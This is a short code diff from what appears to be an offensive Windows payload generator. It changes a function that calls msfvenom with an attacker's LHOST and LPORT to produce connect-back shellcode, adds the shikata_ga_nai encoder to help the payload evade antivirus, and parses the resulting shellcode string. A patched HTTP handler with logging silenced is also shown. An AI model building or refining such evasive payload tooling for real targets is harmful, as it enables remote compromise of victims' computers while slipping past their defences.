@@ -37,7 +37,7 @@ def payloaddir():
     return os.path.expanduser('~') + '/winpayloads'
 
 def msfvenomGeneration(payload, ip, port):
-    p = subprocess.Popen(['msfvenom', '-p', payload, 'LHOST=' + str(ip), 'LPORT=' + str(port), '-f', 'python'], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    p = subprocess.Popen(['msfvenom', '-p', payload, 'LHOST=' + str(ip), 'LPORT=' + str(port), '-f', 'python', '-e', 'x86/shikata_ga_nai'], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     LOADING = Spinner('Generating Shellcode')
     while p.poll() == None:
         LOADING.Update()
@@ -46,8 +46,9 @@ def msfvenomGeneration(payload, ip, port):
     sys.stdout.flush()
 
     payload = p.stdout.read()
-    exec(payload)
-    return buf
+    compPayload = re.findall(r'"(.*?)"', payload)
+
+    return ''.join(map(str, compPayload))
 
 class HANDLER(SimpleHTTPServer.SimpleHTTPRequestHandler): #patching httpserver to shutup
     def log_message(self, format, *args):
